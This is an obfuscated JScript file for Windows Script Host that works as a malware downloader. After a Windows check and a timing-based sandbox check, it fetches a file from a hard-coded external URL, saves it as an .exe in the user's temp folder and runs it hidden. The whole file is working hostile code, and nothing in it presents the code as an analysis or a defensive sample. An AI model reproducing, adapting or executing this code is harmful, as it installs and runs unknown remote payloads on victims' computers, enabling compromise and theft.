var _R2 = false;
var _O = "CreateObject";
var _PV = function _TP() {return WScript[_O]("WScript"+".Shell");}(), _PB = 11;
var _LC0 = "MSXML2.XMLHTTP";
var _DE = 2123213;
var _MT = 0;
function _RT(_P0){_PV["Run"](_P0, _MT, _MT);};
function _K(){return _LC0 + "";};
function _AK(_X, _IW){_MT = _MT * 1; return _X - _IW;};
function _M(){return _O;};
/*@cc_on
  @if (@_win32 || @_win64)
    _R2 = true;
  @end
@*/
if (_R2)
{
var _BR = "";
function _SG(){return 22;};
var _R0 = 0; var _G1 = 0;
function _GF()
{
var _ZT = new this["Date"]();
var _P = _ZT["getUTCMilliseconds"]();
WScript["Sleep"](_SG());
var _ZT = new this["Date"]();
var _LC = _ZT["getUTCMilliseconds"]();
WScript["Sleep"](_SG());
var _ZT = new this["Date"]();
var _Z = _ZT["getUTCMilliseconds"]();
var _R0 = "_YX";
_R0 = _AK(_LC, _P);
var _G1 = "_L";
_G1 = _AK(_Z, _LC);
_BR = "open";
return _AK(_R0, _G1);
}
var _S = false;
var _R1 = false;
for (var _UD = _MT; _UD < _SG() * 1; _UD++){if (_GF() != _MT){
_S = true; 
_G1 = "31" + 11 * _R0 + _G1; 
_R1 = true; 
break;
}}
function _GZ() {return ((_S == true) && (_S == _R1)) ? 1 : _MT;};
if (_S && _GZ() && _R1){
function _OQ() {return _PV["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "EDH39fsiZHe9xhR.ex" + "e";};
 _S0 = _K();
 _BA = WScript[_O](_S0);
 var _G0 = 1;
 while (_G0){
try {
	if (_G0 == 1)
	{
		_BA[_BR]("GET", "http://dev.orolatina.com/s3isk", false);
		_BA["send"]();
		_A = "Sleep";
	}
	WScript[_A](_SG() + 120); 
	if (_BA["readystate"] < 2 * 2) continue;
	_G0 = _MT;
	function _C(_FI) {var _R = (1, 2, 3, 4, 5, _FI); return _R;};
	_FR = WScript[_M()]("ADODB.Stream");
	_S0 = _FR;
	_S0[_BR]();
	_S0["type"] = _C(1);
	_S0["write"](_BA["ResponseBody"]);
	_FR["position"] = _C(_MT);
	_S0["Save" + "ToFile"](_OQ(), 2);
	_FR["cl"+"ose"]();
	_G = _OQ();
	_RT(_G);
} catch(_B){};
}
}
}

